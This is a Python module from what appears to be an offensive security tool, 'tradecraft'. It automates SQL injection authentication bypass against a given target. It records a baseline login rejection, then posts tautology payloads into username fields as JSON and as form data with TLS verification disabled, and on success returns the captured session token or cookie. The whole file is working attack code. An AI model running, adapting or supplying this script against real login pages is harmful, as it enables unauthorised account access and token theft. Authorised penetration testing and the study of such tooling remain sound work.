"""
Network execution for sqli_login: probes login endpoints with SQL tautology payloads.
No parsing logic here -- see parse.py.
"""
from __future__ import annotations

from typing import Optional

import requests
import urllib3

from tradecraft.adapters.sqli_login import parse as sqli_parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_TIMEOUT = 10


def execute(
    target: str,
    username_field: str = "",
    password_field: str = "",
    login_path: str = "",
    timeout: int = DEFAULT_TIMEOUT,
    session: Optional[requests.Session] = None,
) -> sqli_parse.RawSqliLoginResult:
    """Executes SQL injection authentication bypass attempts across candidate endpoints."""
    target_url = sqli_parse.normalize_target_url(target)
    if not target_url:
        return sqli_parse.RawSqliLoginResult(error="empty target URL")

    candidate_urls = sqli_parse.resolve_candidate_urls(target_url, login_path=login_path)
    if not candidate_urls:
        return sqli_parse.RawSqliLoginResult(target=target_url, error="no candidate login URLs found")

    close_session = False
    if session is None:
        session = requests.Session()
        close_session = True

    user_fields = (
        (username_field.strip(),)
        if username_field and username_field.strip()
        else sqli_parse.DEFAULT_USER_FIELDS
    )
    pwd_field = password_field.strip() if password_field and password_field.strip() else "password"

    last_error: Optional[str] = None

    try:
        for url in candidate_urls:
            # 1. Baseline: send invalid credentials to record expected rejection behavior
            try:
                base_resp = session.post(
                    url,
                    json={"email": "rh_baseline_user", "password": "rh_baseline_pass"},
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False,
                    headers={"User-Agent": "Mozilla/5.0 tradecraft/1.0"},
                )
                baseline_status = base_resp.status_code
                baseline_cookies = base_resp.cookies.get_dict()
            except requests.RequestException as e:
                last_error = f"Baseline request failed for {url}: {e}"
                continue

            # 2. Iterate tautology payloads across user fields
            for ufield in user_fields:
                for payload in sqli_parse.DEFAULT_TAUTOLOGY_PAYLOADS:
                    login_data = {ufield: payload, pwd_field: "x"}

                    # Try JSON payload first, fallback to form data if JSON fails
                    for use_json in (True, False):
                        try:
                            kwargs = {"json": login_data} if use_json else {"data": login_data}
                            resp = session.post(
                                url,
                                timeout=timeout,
                                allow_redirects=False,
                                verify=False,
                                headers={"User-Agent": "Mozilla/5.0 tradecraft/1.0"},
                                **kwargs,
                            )
                        except requests.RequestException as e:
                            last_error = str(e)
                            continue

                        try:
                            json_data = resp.json()
                        except Exception:
                            json_data = None

                        cookies_dict = resp.cookies.get_dict()
                        token, auth_type = sqli_parse.extract_token_from_response(
                            data=json_data,
                            headers=dict(resp.headers),
                            cookies=cookies_dict,
                            status_code=resp.status_code,
                        )

                        bypassed = sqli_parse.is_login_bypass(
                            baseline_status=baseline_status,
                            baseline_cookies=baseline_cookies,
                            current_status=resp.status_code,
                            current_cookies=cookies_dict,
                            token=token,
                        )

                        if bypassed:
                            return sqli_parse.RawSqliLoginResult(
                                target=target_url,
                                login_url_used=url,
                                success=True,
                                auth_type=auth_type or "session",
                                token=token,
                                payload_used=payload,
                                field_used=ufield,
                                error=None,
                            )

        return sqli_parse.RawSqliLoginResult(
            target=target_url,
            success=False,
            error=last_error or "no SQLi login bypass confirmed",
        )
    finally:
        if close_session:
            session.close()
